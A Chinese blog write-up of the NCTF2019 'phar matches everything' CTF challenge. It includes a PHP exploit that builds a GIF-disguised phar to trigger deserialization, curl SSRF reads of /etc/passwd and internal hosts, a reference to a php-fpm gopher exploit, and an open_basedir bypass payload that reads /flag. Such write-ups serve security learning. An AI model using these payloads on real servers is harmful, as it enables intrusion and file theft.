---
title: "[NCTF2019]phar matches everything"
date: 2020-05-02
tags: [CTF,WP,PHP,反序列化]
categories:
- [CTF, PHP]
- [CTF, WP]
comments: false
---

# [NCTF2019]phar matches everything

<!-- more -->

## 分析

**源码**

```
<?php
class Easytest{
    protected $test;
    public function funny_get(){
        return $this->test;
    }
}

class Main {
    public $url;
    public function curl($url){
        $ch = curl_init();  
        curl_setopt($ch,CURLOPT_URL,$url);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
        $output=curl_exec($ch);
        curl_close($ch);
        return $output;
    }
public function __destruct(){
        $this_is_a_easy_test=unserialize($_GET['careful']);
        if($this_is_a_easy_test->funny_get() === '1'){
            echo $this->curl($this->url);
        }
    }    
}
if(isset($_POST["submit"])) {
    $check = getimagesize($_POST['name']);
    if($check !== false) {
        echo "File is an image - " . $check["mime"] . ".";
    } else {
        echo "File is not an image.";
    }
}
?>
```

### 两次序列化

第一个是利用`getimagesize($file_path)`触发`phar`反序列化，触发的反序列化影响Main类

第二个很简单,要是`Easytest`中的`test=1`

利用`curl`读取文件

**exp.php**

```
<?php

class Easytest {
	protected $test = '1';
}

class Main {
	public $url ='file:///etc/passwd';
}

$a = new Easytest();
echo serialize($a);
echo urlencode(serialize($a));
$b = new Main();
@unlink("exp.phar");
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub('GIF89a' . "<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($b);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
rename('exp.char', "exp.gif");
```

首先上传`exp.gif`

[![mark](https://blogjpg.yanmy.top/blog/20200502/6dYAPUL1PxQC.png?imageslim)](https://blogjpg.yanmy.top/blog/20200502/6dYAPUL1PxQC.png?imageslim)

然后利用`catchmime.php`传参触发反序列化

`careful`用来触发2

```
name`用来触发`phar
```

[![mark](https://blogjpg.yanmy.top/blog/20200502/IvRGNO5gryyM.png?imageslim)](https://blogjpg.yanmy.top/blog/20200502/IvRGNO5gryyM.png?imageslim)

改变`url`读取hosts,因为这道题想让我们打内网

[![mark](https://blogjpg.yanmy.top/blog/20200502/ARLi3vvvsEdD.png?imageslim)](https://blogjpg.yanmy.top/blog/20200502/ARLi3vvvsEdD.png?imageslim)

[![mark](https://blogjpg.yanmy.top/blog/20200502/ctjN6Nkrlpv9.png?imageslim)](https://blogjpg.yanmy.top/blog/20200502/ctjN6Nkrlpv9.png?imageslim)

我读取到了`173.187.197.10`,再用http协议读一下`http://173.187.197.10`,发现就是当前页面,再读一下 `http://173.187.197.11`

[![mark](https://blogjpg.yanmy.top/blog/20200502/wgylUttLBoAT.png?imageslim)](https://blogjpg.yanmy.top/blog/20200502/wgylUttLBoAT.png?imageslim)

### php-fpm未授权漏洞

[php-fpm未授权漏洞](https://evoa.me/index.php/archives/52/#toc-SSRFGopher)

使用链接中的`exp`

再使用`gopher`协议使用exp生成的`payload`

先打`phpinfo();`可以得知需要绕过`open_basedir`

加上绕过`open_basedir`的payload就可以了

```
<?php mkdir('/tmp/fuck');chdir('/tmp/fuck');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(scandir('/'));readfile('/flag');?>
```

flag在根目录

[![mark](https://blogjpg.yanmy.top/blog/20200502/MkFvqjnF23zV.png?imageslim)](https://blogjpg.yanmy.top/blog/20200502/MkFvqjnF23zV.png?imageslim)

[![mark](https://blogjpg.yanmy.top/blog/20200502/cCKxtrWK4nWi.png?imageslim)](https://blogjpg.yanmy.top/blog/20200502/cCKxtrWK4nWi.png?imageslim)

[![mark](https://blogjpg.yanmy.top/blog/20200502/VDMHTyd45wxR.png?imageslim)](https://blogjpg.yanmy.top/blog/20200502/VDMHTyd45wxR.png?imageslim)

## Reference

[[NCTF2019\]phar matches everything(phar反序列化)](https://guokeya.github.io/post/1byvbzb_I/)